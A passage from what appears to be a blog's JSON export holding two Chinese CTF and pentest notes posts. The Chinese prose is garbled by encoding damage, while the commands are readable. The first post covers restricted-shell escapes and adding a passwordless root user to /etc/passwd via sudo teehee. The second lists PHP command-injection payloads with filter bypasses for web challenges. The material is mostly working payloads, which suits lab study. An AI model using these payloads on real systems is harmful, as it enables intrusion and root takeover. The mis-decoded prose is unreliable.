lua1os.execute(&#x27;/bin/sh&#x27;)\n\n(5) ruby1exec &quot;/bin/sh&quot;\n\n7.å…¶ä»–å¯ä»¥å°è¯•çš„æ–¹æ³•ssh1234ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;ssh username@IP -t &quot;bash --noprofile&quot;ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (sehllshock)ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)\n\nzip1zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;\n\ntar1tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\nawk**(è¶…çº§ç›ä¸½é¶æœºä½¿ç”¨å®ƒæˆåŠŸäº†)**1awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; \n\n8.åˆ‡æ¢ç”¨æˆ·æ—¶é€ƒé€¸è¿™é‡Œçš„åŸç†æ¶‰åŠåˆ°su å’Œ su- çš„åŒºåˆ«ï¼š\nsuå‘½ä»¤ï¼Œåªä¼šæ›´æ”¹å½“å‰ç”¨æˆ·ï¼Œè€Œä¸ä¼šæ›´æ”¹å½“å‰çš„ç”¨æˆ·ç¯å¢ƒï¼Œæ¯”å¦‚ä½ ä»oracle ç”¨æˆ·suåˆ°rootè´¦æˆ·ä¸­ï¼Œå½“å‰è·¯å¾„ä»æ˜¯ä½ åˆšæ‰çš„è·¯å¾„ï¼Œç¯å¢ƒå˜é‡ä»æ˜¯oracleç”¨æˆ·çš„\nsu- å‘½ä»¤ï¼Œåˆ™åœ¨æ›´æ”¹å½“å‰ç”¨æˆ·ä¿¡æ¯çš„åŒæ—¶è¿˜ä¼šæ›´æ”¹ç”¨æˆ·ç¯å¢ƒï¼Œä½†æ˜¯å‡å¦‚ä½ ä»oracle ç”¨æˆ·su -åˆ°rootè´¦æˆ·ï¼Œä½ ä¼šå‘ç°ä½ çš„å½“å‰è·¯å¾„å·²ç»å˜ä¸º&#x2F;root&#x2F;ï¼Œç¯å¢ƒå˜é‡ä¹Ÿå˜\n123su -l twsu - twsu --login tw\n\n9.å¦ç±»æ–¹æ³•(DC-2é¶æœºä½¿ç”¨å®ƒæˆåŠŸäº†)12345# åˆ©ç”¨bash_cmdsè‡ªå®šä¹‰ä¸€ä¸ªshellBASH_CMDS[cat]=/bin/sh;cat# æ·»åŠ ç¯å¢ƒå˜é‡export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin\n\nTeeheeteeheeæ˜¯ä¸ªå°ä¼—çš„linuxç¼–è¾‘å™¨ã€‚å¦‚æœæœ‰sudoæƒé™ã€‚å¯ä»¥åˆ©ç”¨å…¶æ¥ææƒ\næ ¸å¿ƒæ€è·¯å°±æ˜¯åˆ©ç”¨å…¶åœ¨passwdæ–‡ä»¶ä¸­è¿½åŠ ä¸€æ¡uidä¸º0çš„ç”¨æˆ·æ¡ç›®\n1echo &quot;sygsdsg::0:0:sygsdsg:/root:/bin/bash&quot; | sudo teehee -a /etc/passwd\n\nè¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯å°† &quot;raaj::0:0:::/bin/bash&quot; è¿™è¡Œæ–‡æœ¬è¿½åŠ åˆ° /etc/passwd æ–‡ä»¶ä¸­ï¼Œç±»ä¼¼äº\n12echo &quot;sygsdsg::0:0:sygsdsg:/root:/bin/bash&quot; &gt; temp.txtsudo teehee -a /etc/passwd &lt; temp.txt\n\næŒ‰ç…§linuxç”¨æˆ·æœºåˆ¶ï¼Œå¦‚æœæ²¡æœ‰shadowæ¡ç›®ï¼Œä¸”passwdç”¨æˆ·å¯†ç æ¡ç›®ä¸ºç©ºçš„æ—¶å€™ï¼Œå¯ä»¥æœ¬åœ°ç›´æ¥suç©ºå¯†ç ç™»å½•ã€‚è¿™ä¸ªç”¨æˆ·å› ä¸ºuidä¸º0ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯rootæƒé™\n\nè¡¥å……\n\n/etc/passwd æ–‡ä»¶ï¼šåŒ…å«ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·åã€ç”¨æˆ·IDï¼ˆUIDï¼‰ã€ç»„IDï¼ˆGIDï¼‰å’Œé»˜è®¤shellç­‰ã€‚\n\n/etc/shadow æ–‡ä»¶ï¼šå­˜å‚¨ç”¨æˆ·çš„å¯†ç å’Œç›¸å…³çš„å®‰å…¨ä¿¡æ¯ã€‚\næ²¡æœ‰ shadow æ¡ç›®ï¼šå¦‚æœæŸä¸ªç”¨æˆ·åœ¨ /etc/shadow ä¸­æ²¡æœ‰ç›¸åº”çš„æ¡ç›®ï¼Œè¿™æ„å‘³ç€è¯¥ç”¨æˆ·æ²¡æœ‰è®¾ç½®å¯†ç æˆ–å…¶å¯†ç æ˜¯ç©ºçš„ã€‚\nå¯†ç æ¡ç›®ä¸ºç©ºï¼šå¦‚æœ /etc/passwd ä¸­è¯¥ç”¨æˆ·çš„å¯†ç å­—æ®µä¸ºç©ºï¼Œä¸”æ²¡æœ‰ç›¸åº”çš„ shadow æ¡ç›®ï¼Œè¡¨ç¤ºå¯ä»¥ä½¿ç”¨ç©ºå¯†ç ç™»å½•ã€‚\n\n\n\ncrontabææƒå‰ç½®çŸ¥è¯†\nhttps://www.runoob.com/w3cnote/linux-crontab-tasks.html\n","slug":"ææƒ","date":"2024-10-22T11:03:03.000Z","categories_index":"æ¸—é€","tags_index":"å†…ç½‘æ¸—é€","author_index":"Sygsdsg"},{"id":"15453c383c32a99612ffdb75790c3ef8","title":"rce","content":"å‘½ä»¤æ‰§è¡Œç›¸å¯¹åœ°å€ &#x2F;flag.php ç»å¯¹åœ°å€**&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php**\n1.å¤åˆ¶æ–‡æœ¬å†…å®¹Web30â€‹    url&#x2F;?c&#x3D;echo cp fl\\*g.p\\*p 1.txt; å°†flag.phpçš„å†…å®¹å¤åˆ¶åˆ°1.txtä¸­\nâ€‹    url&#x2F;?c&#x3D;echo mv fl\\*g.p\\*p 1.txt;\nâ€‹    è®¿é—®url&#x2F;1.txt è·å–æ–‡æœ¬å†…å®¹\n2.åµŒå¥—å‘½ä»¤æ‰§è¡ŒWeb31l url&#x2F;?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(â€˜cat flag.phpâ€™);  â€˜1â€™å‚æ•°é€ƒé€¸å‡ºå»ä¸å—è¿‡æ»¤é™åˆ¶\nWeb32l url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;fla\ng.php       ps:ç”¨includeé€ƒé€¸å‚æ•° è¦æ­é…æ–‡ä»¶è¯»å–ä½¿ç”¨\nurl&#x2F;?c&#x3D;require%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php ;åˆ†å·è¢«è¿‡æ»¤ å¯æ›¿æ¢æˆ?&gt;\n3.æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡ŒWeb37â€‹    å‡ºç°include($c) include($c.php)æˆ–ä»£ç å³å¯ç”¨æ–‡ä»¶åŒ…å« ä½¿ç”¨dataä¼ªåè®®\nurl&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,\nweb38url&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, çŸ­æ ‡ç­¾\n4.æ— å‚æ•°RCEWeb40url&#x2F;?c&#x3D;print_r(get_defined_vars()); è·å–å¹¶æ‰“å°å½“å‰ä½œç”¨åŸŸä¸­æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡çš„æ•°ç»„\nå³å¯è‡ªå®šä¹‰ä¸€ä¸ªå˜syé‡ eg:1&#x3D;phpinfo(); \nâ€‹                               \nurl&#x2F;?c&#x3D;print_r(next(get_defined_vars()));\n**next()** æ˜¯ PHP ä¸­ç”¨äºå°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨å¹¶è¿”å›å½“å‰å…ƒç´ çš„å‡½æ•°\nurl&#x2F;?c&#x3D;print_r(array_pop(next(get_defined_vars()))); å¼¹å‡ºæ•°ç»„å€¼\nurl&#x2F;?c&#x3D;eval(array_pop(next(get_defined_vars()))); æ‰§è¡Œå‘½ä»¤ \n \n5. shell é‡å®šå‘æ“ä½œWeb42&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰éƒ½è¢«é‡å®šå‘åˆ° &#x2F;dev&#x2F;null å³å¯åŒå†™ç»•è¿‡\nurl&#x2F;?c&#x3D;cat flag.php;ls\nweb43 è¿‡æ»¤åˆ†å·\nurl&#x2F;?c&#x3D;cat flag.php&amp;&amp;ls\nweb45 è¿‡æ»¤ç©ºæ ¼\nurl&#x2F;?c&#x3D;tac%09fl*.php%26%26ls\n6.Web50â€‹    nl&lt;flag.php||ls è¿™ç§æ–¹å¼ä¸æ”¯æŒ* ï¼Ÿé€šé…ç¬¦\nâ€‹    nl&lt;flaâ€™â€™g.php||ls  shellç‰¹æ€§ ç”¨ â€˜â€™ åˆ†éš”ï¼Œå‘½ä»¤æ‰§è¡Œæ—¶ä¼šè‡ªåŠ¨å¿½ç•¥\n7. web52 cp$IFSfl?g.ph?$IFSa.txt||ls\n cp${IFS}fl?g.ph?${IFS}a.txt||ls\n cp${IFS}&#x2F;fl?g${IFS}b.txt||ls\n8.web55?c&#x3D;&#x2F;???&#x2F;????64 ????.???\n?c&#x3D;&#x2F;bin&#x2F;base64 flag.php\n?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????.???\n?c&#x3D;&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php\næœ€åè®¿é—®**&#x2F;flag.php.bz2**å³å¯\nä¸‹è½½ä¸‹æ¥çš„å‹ç¼©åŒ…ä¸­åŒ…å«æœ‰flag.php\n9.web56â€‹    è‡ªå®šä¹‰è„šæœ¬ ä¸Šä¼ æœåŠ¡å™¨è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nâ€‹    è‡ªå·±æ­å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ è¦æŒ‡å®šå¥½ç›®æ ‡url \n  \nä¸´æ—¶æ–‡ä»¶å­˜æ”¾ç›®å½•å‘½åè§„åˆ™ eg:&#x2F;tmp&#x2F;phpaaaaaX  php+äº”ä½å°å†™å­—æ¯+ä¸€ä½å¤§å†™å­—æ¯\nä½¿ç”¨é€šé…ç¬¦ &#x2F;???&#x2F;????????[@-[]   asciiå€¼ @ åˆ° [ ä¹‹é—´ä¸ºå¤§å†™å­—æ¯\nåœ¨æ–‡ä»¶ä¸Šä¼ é¡µé¢ä¸Šä¼ å¹¶æŠ“åŒ…\nä¿®æ”¹æ•°æ®åŒ…å†…å®¹ä¸ºå‘½ä»¤æ“æ§è„šæœ¬ ä¸€èˆ¬ä¸Šä¼ txt\n   \n  \nå“åº”å¦‚ä¸‹ å³å¯æ­£å¸¸rce   \n\n10.web58 æ–‡ä»¶è¯»å–echo file_get_contents(â€˜flag.phpâ€™);\nhighlight_file(â€˜flag.phpâ€™);\nshow_source(â€˜flag.phpâ€™);\ninclude_file(â€˜flag.phpâ€™);echo $flag;\ninclude(â€˜flag.phpâ€™);var_dump(get_defined_vars());\n11.web 66Flagæ¢ä½ç½® ä½¿ç”¨var_dump(scandir(â€˜&#x2F;â€˜)); var_export(scandir(â€˜&#x2F;â€˜));**\n ..&#x2F; ä¸Šä¸€çº§ç›®å½• \n. å½“å‰ç›®å½• &#x2F; æ ¹ç›®å½•\ninclude(â€˜&#x2F;flag.txtâ€™);\n12.web 71\n \nå°†flagè½¬æ¢æˆï¼Ÿ\n \n æ­¤æ—¶åœ¨å‘½ä»¤åæ·»åŠ ä¸€ä¸ª exit(); ä¸­æ–­ä¸‹åˆ—å‘½ä»¤å³å¯\ninclude(â€˜&#x2F;flag.txtâ€™);exit();\ninclude(â€˜&#x2F;flag.txtâ€™);ob_flush();\ninclude(â€˜&#x2F;flag.txtâ€™); ob_end_flush();\ninclude(â€˜&#x2F;flag.txtâ€™);die();\nc&#x3D;$a&#x3D;â€glob:&#x2F;&#x2F;&#x2F;*.txtâ€;\n13.web72globå¯ä»¥éå†ç›®å½•ï¼Œå¹¶ä¸”ä¸å—disable_functionsçš„é™åˆ¶ã€‚\nâ€‹    æ„é€ c&#x3D;?&gt;__toString().' ');} exit(0); ?>\nå…¶å®å°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªphpè¯­å¥ã€‚é¦–å…ˆglobæŸ¥æ‰¾æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•ï¼ˆglob:&#x2F;&#x2F; &#x2F;*è¿™æ ·æ›´åŠ æ¸…æ¥šäº›ï¼‰ã€‚ç„¶åå¾ªç¯æ‰§è¡Œå¹¶è¾“å‡ºç»™$fï¼Œåœ¨è¾“å‡º$fã€‚\nâ€‹            \n14.web73 é€šè¿‡è¿æ¥æ•°æ®åº“è¯»å–c&#x3D;\ntry {$dbh &#x3D; new PDO(â€˜mysql:host&#x3D;localhost;dbname&#x3D;ctftrainingâ€™, â€˜rootâ€™,â€™rootâ€™);foreach($dbh-&gt;query(â€˜select load_file(â€œ&#x2F;flag36.txtâ€)â€™) as $row){echo($row[0]).â€|â€; }$dbh &#x3D; null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);\næ•°æ®åº“åctftraining åœ¨web58é€šè¿‡èšå‰‘è¿æ¥å¯ä»¥è·å–\næ­¤æ–¹æ³•æ­é…72å…³éå†ç›®å½•ä½¿ç”¨\n15.web77 FFI å³å¤–éƒ¨å‡½æ•°æ¥å£å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚PHPçš„FFIæ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨PHPé‡Œè°ƒç”¨Cä»£ç çš„æŠ€æœ¯\n1**c=$ffi = FFI::cdef(&quot;int system(const char \\*command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);**\n\n$ffi &#x3D; FFI::cdef(â€œint system(const char *command);â€);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡\n$a&#x3D;â€™&#x2F;readflag &gt; 1.txtâ€™;&#x2F;&#x2F;æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å°†å†…å®¹è¾“å‡ºåˆ°1.txt\n$ffi-&gt;system($a);&#x2F;&#x2F;é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°\nå†è®¿é—®1.txt\n16.é€šè¿‡ç³»ç»Ÿå˜é‡æ¥æ„é€ å‘½ä»¤web118æ€è·¯ä¸€\n$&#123;PWD&#125; è¡¨ç¤ºå½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„\n$&#123;PATH&#125; æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡\né€šå¸¸åŒ…å«/binã€/usr/binã€/sbinã€/usr/sbin ç­‰ç›®å½•\nå¯ä»¥å‘ç°è¿™å‡ ä¸ªç›®å½•çš„æœ€åä¸€ä¸ªå­—æ¯éƒ½æ˜¯n\næ¥ä¸‹æ¥å†çœ‹çœ‹æ€ä¹ˆé€šè¿‡ç³»ç»Ÿå˜é‡æ¥è·å–å­—æ¯\necho ${PWD}&#x2F;rootecho ${PWD:0:1} #è¡¨ç¤ºä»0ä¸‹æ ‡å¼€å§‹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦&#x2F;echo ${PWD:0:1} #ä»ç»“å°¾å¼€å§‹å¾€å‰çš„ç¬¬ä¸€ä¸ªå­—ç¬¦techo ${PWD:0}techo ${PWD:~A} #æ‰€ä»¥å­—æ¯å’Œ0å…·æœ‰åŒæ ·ä½œç”¨t\né€šè¿‡æç¤ºå¯å¾—å½“å‰ç›®å½•æ˜¯&#x2F;var&#x2F;www&#x2F;html\nå¯ä»¥æ„é€ nlå‘½ä»¤\npayload: nl å¦‚ä¸‹æ˜¯ç¯å¢ƒå˜é‡æ„é€  ç©ºæ ¼**$IFS**ä»£æ›¿ flag.phpç”¨ **????.???**ä»£æ›¿\n${PATH:0}${PWD:0}$IFS????.???\nçœ‹æºä»£ç å³å¯\n17.é€šè¿‡è¿›ç¨‹ç´¯åŠ å™¨æ¥è·å–å­—ç¬¦æ„é€ å‘½ä»¤web119æ„é€  &#x2F;bin&#x2F;cat xxxx.xxx\nSHLVLæ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶${SHLVL}&#x3D;1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶${SHLVL}&#x3D;2ã€‚\n$:${SHLVL}}å°±è¾“å‡º&#x2F;\næ±‡æ€»ä¸€ä¸‹æ¯ä¸ªæ•°å­—çš„ä»£æ›¿æ–¹å¼\n0ï¼š**$ã€$:$:$}\nr   ${PWD:$}\npayload:\n&#x2F;???&#x2F;??v ????.???\n${PWD::$}???${PWD::$}??${PWD:$:$} ????.???\n&#x2F;???&#x2F;r? ????.???\n${PWD::$}???${PWD::$}${PWD:$}?? ????.???\n19.web122æ„é€   &#x2F;bin&#x2F;base64 xxxx.xx\nä»¥base64çš„å½¢å¼æ¥è¾“å‡ºæ–‡ä»¶\n${HOME}&#x3D;&#x2F;root\n&#x2F;   ${HOME::$?}   **$?ä¸&lt;A;**æ­é…ä½¿ç”¨\n6   ${RANDOM::$?} è¿™é‡Œä½¿ç”¨éšæœºæ•°æ¥ç¢°æ’å‡ºæ•°å­—6\n&lt;A; è¿”å›çš„é”™è¯¯å€¼ ä½¿å¾— $? ä¸º1\npayload:\n&#x2F;???&#x2F;????6? ????.???\n&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.???\n20.web124\n1234&lt;?php$hexadecimal = &#x27;a37334&#x27;;echo base_convert($hexadecimal, 16, 2);?&gt;\n\n1è¾“å‡ºï¼š101000110111001100110100\n\n\n12345&lt;?phpecho bindec(&#x27;110011&#x27;) . &quot;\\n&quot;;echo bindec(&#x27;000110011&#x27;) . &quot;\\n&quot;;echo bindec(&#x27;111&#x27;);?&gt;\n\nä»¥ä¸Šç¤ºä¾‹ä¼šè¾“å‡ºï¼š\n12351517\n\n\n1234&lt;?phpecho decbin(12) . &quot;\\n&quot;;echo decbin(26);?&gt;\n\nä»¥ä¸Šç¤ºä¾‹ä¼šè¾“å‡ºï¼š\n12110011010\n\n\n\nåŠ¨æ€å‡½æ•°è°ƒç”¨è¦ä½¿ç”¨ $var&#123;func&#125; è¿™ç§å½¢å¼\n $var æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ&#123;func&#125; è¡¨ç¤ºå‡½æ•°å\nå¦‚æœç›´æ¥ä½¿ç”¨ $funcï¼Œåˆ™ PHP å¼•æ“ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ä¸ªæœªå®šä¹‰çš„å¸¸é‡ï¼Œå¹¶ä¸ä¼šå½“æˆä»£ç æ¥æ‰§è¡Œ\n&#96;&#96;&lt;?php&#96; \necho (&#39;system&#39;)(&#39;dir&#39;);\n?&gt;\nè¾“å‡ºé¡µé¢\n\n\nåœ¨web124ä¸­ï¼Œæˆ‘ä»¬è¦åœ¨å¯ç”¨å‡½æ•°ä¸­é€šè¿‡æ•°å­—çš„è¿›åˆ¶è½¬æ¢æ¥æ„é€ å­—ç¬¦ä¸²\næœ€å…ˆæƒ³åˆ°çš„ä¾¿æ˜¯hex2binå› ä¸ºä»–æœ€ç»ˆå¯ä»¥è¿”å›asciiå€¼æ¥æ„é€ å­—ç¬¦ä¸²\nä½†æ˜¯hex2binè¢«ç¦ç”¨ä¾¿å¯ä»¥é€šè¿‡base_convertæ¥æ„é€ \né€šè¿‡å®éªŒé€†å‘æ„é€ \n1base_convert(&#x27;hex2bin&#x27;,36,10)\tâ†’\t37907361743\n\nå¯å¾—ç¬¬ä¸€éƒ¨åˆ†ç›®æ ‡ä»£ç \n1base_convert(&#x27;37907361743&#x27;,10,36)\n\né€šè¿‡phpåŠ¨æ€å‡½æ•°è°ƒç”¨ï¼Œæˆ‘ä»¬æœ€ç»ˆè¦æ„é€ \n(â€˜hex2binâ€™)(â€˜hexå­—ç¬¦ä¸²â€™) æ¥æ„é€ å‡º â€˜_GETâ€˜\nç¬¬ä¸€éƒ¨åˆ†å·²ç»å®Œæˆï¼Œæ¥ä¸‹æ¥æ„é€ ç¬¬äºŒéƒ¨åˆ†\né¢˜ç›®ä¸­å­—æ¯ä¹Ÿè¢«ç¦ç”¨\næ–‡æœ¬è½¬16è¿›åˆ¶å†è½¬10è¿›åˆ¶å¾—\n1_GET â†’ 5f474554 â†’ 1598506324\n\nå¯å¾—ç¬¬äºŒéƒ¨åˆ†ç›®æ ‡ä»£ç \n1dechex(1598506324)\n\n(â€˜hex2binâ€™)(â€˜hexå­—ç¬¦ä¸²â€™)ä¸¤éƒ¨åˆ†æ›¿æ¢åå¾—\nbase_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))      _GET\nå†é€šè¿‡åŠ¨æ€å‡½æ•°è°ƒç”¨æ„é€ äºŒæ¬¡ä¼ å‚\n?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));  åŠ¨æ€å‡½æ•°è°ƒç”¨éƒ¨åˆ†\n$$pi &#x3D; $_GET   å³å¯æ„é€ äºŒæ¬¡ä¼ å‚ å¹¶ä¸” [] è®© ban äº†æ›¿æ¢æˆ {} å³å¯\n$$pi{abs}($$a{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls;  æ„é€ äºŒæ¬¡ä¼ å‚éƒ¨åˆ†  \nå…¶ä¸­**$$pi{abs};æ˜¯$var{func}ä¸­çš„$varï¼Œ$$pi{acos};æ˜¯$var{func}ä¸­çš„{func}**\næœ€ç»ˆpayload:\n?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls; \né€‰piæ˜¯å› ä¸ºä»–æ˜¯åœ¨ç™½åå•ä¸­æœ€çŸ­çš„ æ–¹ä¾¿ç»•è¿‡é•¿åº¦é™åˆ¶\n","slug":"rce","date":"2024-10-22T05:28:00.000Z","categories_index":"ctfå…¥é—¨","tags_index":"php","author_index":"Sygsdsg"}]